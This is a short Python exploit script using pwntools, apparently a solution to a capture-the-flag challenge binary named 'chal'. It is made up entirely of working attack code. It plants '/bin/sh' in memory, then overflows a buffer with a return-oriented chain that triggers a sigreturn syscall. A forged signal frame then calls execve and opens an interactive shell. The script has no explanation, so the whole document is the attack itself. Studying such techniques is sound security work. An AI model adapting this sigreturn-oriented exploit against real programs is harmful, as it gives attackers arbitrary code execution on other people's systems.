from pwn import *
elf = context.binary = ELF("./chal")
p = process(elf.path)

p.sendlineafter(b"What is your name?", b"/bin/sh\x00")

BINSH_ADDR = 0x402094
SYSCALL = 0x000000000040100d
inc_al = 0x0000000000401012
xor_eax = 0x0000000000401010

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = BINSH_ADDR
frame.rsi = 0x0
frame.rdx = 0x0
frame.rip = SYSCALL

payload = b"A"*32
payload += p64(xor_eax)
payload += p64(inc_al)*(0xf-1)
payload += p64(SYSCALL)
payload += bytes(frame)
p.sendlineafter(b">", payload)
p.interactive()


